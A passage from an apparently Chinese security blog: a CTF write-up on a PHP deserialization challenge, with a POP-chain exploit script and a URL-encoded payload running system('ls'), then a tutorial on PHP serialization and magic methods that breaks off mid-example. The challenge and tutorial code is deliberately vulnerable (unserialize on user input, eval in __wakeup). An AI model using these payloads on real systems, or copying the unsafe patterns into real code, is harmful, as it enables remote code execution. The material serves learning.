class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">PD9waHANCmNsYXNzIFRpZ2Vyew0KICAgIHB1YmxpYyAkc3RyaW5nOw0KICAgIHByb3RlY3RlZCAkdmFyOw0KICAgIHB1YmxpYyBmdW5jdGlvbiBfX3RvU3RyaW5nKCl7DQogICAgICAgIHJldHVybiAkdGhpcy0+c3RyaW5nOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gYm9zcygkdmFsdWUpew0KICAgICAgICBAZXZhbCgkdmFsdWUpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gX19pbnZva2UoKXsNCiAgICAgICAgJHRoaXMtPmJvc3MoJHRoaXMtPnZhcik7DQogICAgfQ0KfQ0KDQpjbGFzcyBMaW9uew0KICAgIHB1YmxpYyAkdGFpbDsNCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoKXsNCiAgICAgICAgJHRoaXMtPnRhaWwgPSBhcnJheSgpOw0KICAgIH0NCiAgICBwdWJsaWMgZnVuY3Rpb24gX19nZXQoJHZhbHVlKXsNCiAgICAgICAgJGZ1bmN0aW9uID0gJHRoaXMtPnRhaWw7DQogICAgICAgIHJldHVybiAkZnVuY3Rpb24oKTsNCiAgICB9DQp9DQoNCg0KY2xhc3MgTW9ua2V5ew0KICAgIHB1YmxpYyAkaGVhZDsNCiAgICBwdWJsaWMgJGhhbmQ7DQogICAgcHVibGljIGZ1bmN0aW9uIF9fY29uc3RydWN0KCRoZXJlPSJab28iKXsNCiAgICAgICAgJHRoaXMtPmhlYWQgPSAkaGVyZTsNCiAgICAgICAgZWNobyAiV2VsY29tZSB0byAiLiR0aGlzLT5oZWFkLiI8YnI+IjsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIF9fd2FrZXVwKCl7DQogICAgICAgIGlmKHByZWdfbWF0Y2goIi9nb3BoZXJ8aHR0cHxmaWxlfGZ0cHxodHRwc3xkaWN0fFwuXC4vaSIsICR0aGlzLT5oZWFkKSkgew0KICAgICAgICAgICAgZWNobyAiaGFja2VyIjsNCiAgICAgICAgICAgICR0aGlzLT5zb3VyY2UgPSAiaW5kZXgucGhwIjsNCiAgICAgICAgfQ0KICAgIH0NCn0NCg0KY2xhc3MgRWxlcGhhbnR7DQogICAgcHVibGljICRub3NlOw0KICAgIHB1YmxpYyAkbmljZTsNCiAgICBwdWJsaWMgZnVuY3Rpb24gX19jb25zdHJ1Y3QoJG5pY2U9Im5pY2UiKXsNCiAgICAgICAgJHRoaXMtPm5pY2UgPSAkbmljZTsNCiAgICAgICAgZWNobyAkbmljZTsNCiAgICB9DQogICAgcHVibGljIGZ1bmN0aW9uIF9fdG9TdHJpbmcoKXsNCiAgICAgICAgcmV0dXJuICR0aGlzLT5uaWNlLT5ub3NlOw0KICAgIH0NCn0NCg0KaWYoaXNzZXQoJF9QT1NUWyd6b28nXSkpew0KICAgIEB1bnNlcmlhbGl6ZSgkX1BPU1RbJ3pvbyddKTsNCn0NCmVsc2V7DQogICAgJGEgPSBuZXcgTW9ua2V5Ow0KICAgIGVjaG8gImhpbnQgaW4gaGludC5waHAhIjsNCn0NCj8+</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tiger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="keyword">string</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">boss</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        @<span class="keyword">eval</span>(<span class="variable">$value</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">boss</span>(<span class="variable">$this</span>-&gt;<span class="keyword">var</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lion</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tail</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;tail = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable">$function</span> = <span class="variable language_">$this</span>-&gt;tail;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$function</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monkey</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$head</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hand</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$here</span>=<span class="string">&quot;Zoo&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;head = <span class="variable">$here</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;Welcome to &quot;</span>.<span class="variable language_">$this</span>-&gt;head.<span class="string">&quot;&lt;br&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/gopher|http|file|ftp|https|dict|\.\./i&quot;</span>, <span class="variable">$this</span>-&gt;head)) &#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hacker&quot;</span>;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;source = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elephant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$nice</span>=<span class="string">&quot;nice&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nice = <span class="variable">$nice</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$nice</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;nice-&gt;nose;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;zoo&#x27;</span>]))&#123;</span><br><span class="line">    @<span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;zoo&#x27;</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Monkey</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hint in hint.php!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以得到这样一条链子<a target="_blank" rel="noopener" href="https://www.yuque.com/ff2qqy/hlcg0a/rss218/edit">关于php反序列化和pop链的学习</a></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title class_">Money</span>::<span class="variable constant_">__wakeup</span> -&gt; <span class="title class_">Elephant</span>::<span class="variable constant_">__toString</span> -&gt; <span class="title class_">Lion</span>::<span class="variable constant_">__get</span> -&gt; <span class="title class_">Tiger</span>::<span class="variable constant_">__invoke</span></span><br></pre></td></tr></table></figure>

<p>exp如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Tiger</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$string</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$var</span> = <span class="string">&quot;system(&#x27;ls&#x27;);&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Lion</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$tail</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;tail = <span class="keyword">array</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Monkey</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$head</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hand</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$here</span>=<span class="string">&quot;Zoo&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;head = <span class="variable">$here</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Elephant</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nose</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nice</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$nice</span>=<span class="string">&quot;nice&quot;</span></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nice = <span class="variable">$nice</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title class_">Elephant</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;nice = <span class="keyword">new</span> <span class="title class_">Lion</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;nice-&gt;tail = <span class="keyword">new</span> <span class="title class_">Tiger</span>;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">Monkey</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>生成得到的序列化字符串：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>Monkey%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>head%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A8%<span class="number">3</span>A%<span class="number">22</span>Elephant%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>nose%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>nice%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>Lion%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>tail%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A5%<span class="number">3</span>A%<span class="number">22</span>Tiger%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span><span class="keyword">string</span>%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>Bs%<span class="number">3</span>A6%<span class="number">3</span>A%<span class="number">22</span>%<span class="number">00</span>%<span class="number">2</span>A%<span class="number">00</span><span class="keyword">var</span>%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A13%<span class="number">3</span>A%<span class="number">22</span>system%<span class="number">28</span>%<span class="number">27</span>ls%<span class="number">27</span>%<span class="number">29</span>%<span class="number">3</span>B%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>D%<span class="number">7</span>Ds%<span class="number">3</span>A4%<span class="number">3</span>A%<span class="number">22</span>hand%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br></pre></td></tr></table></figure>

<p>通过post传递给zoo</p>

      
    </div>
    
    <div class="article-info article-info-index">
      
      

      
      
      <div class="clearfix"></div>
    </div>
    
  </div>
  
</article>









  
    <article id="post-php反序化和pop链" class="article article-type-post" itemscope itemprop="blogPost">
  
    <div class="article-meta">
      <a href="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/" class="article-date">
      <time datetime="2022-05-04T16:00:00.000Z" itemprop="datePublished">2022-05-05</time>
</a>


    </div>
  
  <div class="article-inner">
    
      <input type="hidden" class="isFancy" />
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/">php反序化和pop链</a>
    </h1>
  

      </header>
      
    
    <div class="article-entry" itemprop="articleBody">
      
          
        <h1 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h1><p><strong>说明</strong></p>
<p><strong>序列化</strong>：将变量（通常是数组和对象）转换为可保存或传输的字符串</p>
<p><strong>反序列化</strong>：在适当的时候把这个字符串再转化成原来的变量（通常是数组和对象）使用。</p>
<p>这两个过程结合起来，可以轻松地存储和传输数据，使程序更具维护性。反序列化本身不是漏洞，但如果反序列化的内容可控，就容易导致漏洞。</p>
<p><strong>访问控制</strong></p>
<p>PHP 对属性或方法的访问控制，是通过在前面添加关键字 public（公有），protected（受保护）或 private（私有）来实现的。</p>
<ul>
<li><strong>public（公有）：</strong>公有的类成员可以在任何地方被访问。</li>
<li><strong>protected（受保护）：</strong>受保护的类成员则可以被其自身以及其子类和父类访问。</li>
<li><strong>private（私有）：</strong>私有的类成员则只能被其定义所在的类访问。</li>
</ul>
<h2 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h2><p><strong>serialize()</strong></p>
<p>string serialize ( mixed $value )</p>
<p>$value: 要序列化的对象或数组。结果返回一个字符串</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0:4:&quot;Test&quot;:2:&#123;s:4:&quot;test&quot;;s:2:&quot;ok&quot;;s:3:&quot;var&quot;;N&#125;</span><br><span class="line"></span><br><span class="line">//0代表这是一个对象，4代表对象名称的长度，2代表成员个数。</span><br><span class="line">//大括号中分别是：属性名类型、长度、名称；值类型、长度、值</span><br><span class="line">//O: 对象 4（类的名字长度为4）&quot;Test&quot;类名称</span><br><span class="line">//2 （对象含有的属性数量）</span><br><span class="line">//s:属性是字符串  4 是属性名称的长度 &quot;test&quot; 属性名称 s:2:&quot;ok&quot; 属性是字符串，长度2，值为&quot;ok&quot; </span><br><span class="line">// s:另一个属性是字符串，3长度，var，属性值，N NULL另一个属性初始值为空  </span><br></pre></td></tr></table></figure>

<p><strong>不同权限的属性，序列化之后的字符串存在区别：</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">      <span class="keyword">public</span> <span class="variable">$text</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$t</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;serialize.txt&quot;</span>,<span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;Test&quot;:1:&#123;s:4:&quot;text&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>

<p>换成private权限，属性在序列化后也会出现区别</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Test</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$test</span>=<span class="string">&#x27;ok&#x27;</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$var</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$t</span> = <span class="keyword">new</span> <span class="title class_">Test</span>();</span><br><span class="line"><span class="variable">$data</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$t</span>);</span><br><span class="line"><span class="keyword">echo</span>(<span class="variable">$data</span>);</span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="string">&quot;serialize.txt&quot;</span>, <span class="variable">$data</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;Test&quot;:2:&#123;s:10:&quot;Testtest&quot;;s:2:&quot;ok&quot;;s:9:&quot;Testvar&quot;;N;&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h2><p>unserlialize()</p>
<p>mixed unserialize(string $str)</p>
<p>$str：序列化后的字符串  。返回的是转化之后的值，可为 integer、float、string、array 或 object。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;a:3:&#123;i:0;s:6:&quot;Google&quot;;i:1;s:6:&quot;Runoob&quot;;i:2;s:8:&quot;Facebook&quot;;&#125;&#x27;</span>;</span><br><span class="line"><span class="variable">$unserialized_data</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$str</span>);</span><br><span class="line"><span class="title function_ invoke__">print_r</span>(<span class="variable">$unserialized_data</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line">  <span class="comment">//运行结果如下：</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  Array</span></span><br><span class="line"><span class="comment">(</span></span><br><span class="line"><span class="comment">    [0] =&gt; Google</span></span><br><span class="line"><span class="comment">    [1] =&gt; Runoob</span></span><br><span class="line"><span class="comment">    [2] =&gt; Facebook</span></span><br><span class="line"><span class="comment">)</span></span><br><span class="line"><span class="comment">  */</span></span><br></pre></td></tr></table></figure>

<h2 id="序列化与反序列化实现"><a href="#序列化与反序列化实现" class="headerlink" title="序列化与反序列化实现"></a>序列化与反序列化实现</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;lily&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sex</span> = <span class="string">&quot;woman&quot;</span>;</span><br><span class="line">    <span class="keyword">protected</span> <span class="variable">$hobby</span> = <span class="string">&quot;violin&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">intro</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;打印结果如下：\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$name:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;name\n&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;$sex:&#x27;</span>.<span class="string">&quot;<span class="subst">$this</span>-&gt;sex\n&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$person1</span>=<span class="keyword">new</span> <span class="title function_ invoke__">person</span>();</span><br><span class="line"><span class="variable">$person1</span>-&gt;<span class="title function_ invoke__">intro</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;========================\n&quot;</span>;</span><br><span class="line"><span class="variable">$mid</span> = <span class="title function_ invoke__">serialize</span>(<span class="variable">$person1</span>);</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$mid</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;========================\n&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="title function_ invoke__">unserialize</span>(<span class="variable">$mid</span>));</span><br></pre></td></tr></table></figure>

<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650896937315-8244eb55-b46c-4247-8b97-cf75bb957abc.png" alt="img"></p>
<h1 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h1><p>PHP魔术方法</p>
<p>除了<code> __construct()</code>，<code> __destruct()</code> ，和<code> __clone()</code> 之外的所有魔术方法都 必须 声明为 public</p>
<p>__construct()	构造函数，当对象创建(new)时会自动调用，但在unserialize()时是不会自动调用的。	</p>
<p>__destruct()		当对象被销毁时会自动调用		</p>
<p>__sleep()		用于清理对象，并返回一个包含对象中所有应被序列化的变量名称的数组，serialize() 函数会检查类中是否存在一个魔术方法 __sleep(),如果存在，该方法会先被调用，然后才执行序列化操作</p>
<p>__wakeup()		新建立数据库连接，或执行其它初始化操作	unserialize()会检查是否存在 __wakeup()，如果存在，则会优先调用 </p>
<p>__toString()		当一个类被转换成字符串时被调用	</p>
<p>__invoke()		当以函数方式调用对象时被调用	</p>
<p>__get()			访问私有类中的变量时，触发</p>
<h2 id="代码分析"><a href="#代码分析" class="headerlink" title="代码分析"></a>代码分析</h2><p>猜测：如果我们将序列化的字符串按格式要求随意更改，是不是可以控制intro()方法的打印信息？</p>
<p>假设：存在url</p>
<p>127.0.0.1&#x2F;usr.php</p>
<p>其对应的后台代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;echo &#x27;I am isee&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span> (<span class="string">&quot;<span class="subst">$this</span>-&gt;name;&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;mid&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$mid</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;mid&#x27;</span>];</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="string">&quot;<span class="subst">$mid</span>&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;h1&gt;hello!!!&lt;h1/&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这段代码定义了一个person类，person类里存在一个敏感函数eval()可以执行任意代码，当反序列化这个person类形成的特殊字符串时会自动触发__wakeup()魔术方法，从而执行eval()函数（本例中，正常情况下，eval()触发会将$name的值当PHP代码解析，即输出I am isee )，访问该页面，不传递参数时返回一个hello！！！信息</p>
<p><img src="/2022/05/05/php%E5%8F%8D%E5%BA%8F%E5%8C%96%E5%92%8Cpop%E9%93%BE/1650978852065-71e1f157-197b-48e1-ac10-066176d950fe.png" alt="img"></p>
<p>如果带上?mid参数服务器后端对应的PHP代码将会反序列化这个用户传参，此时如果我们在本地正常序列化这个peson类并拼接到?mid的结果是这样的：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;echo &#x27;i am isee&#x27;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&quot;<span 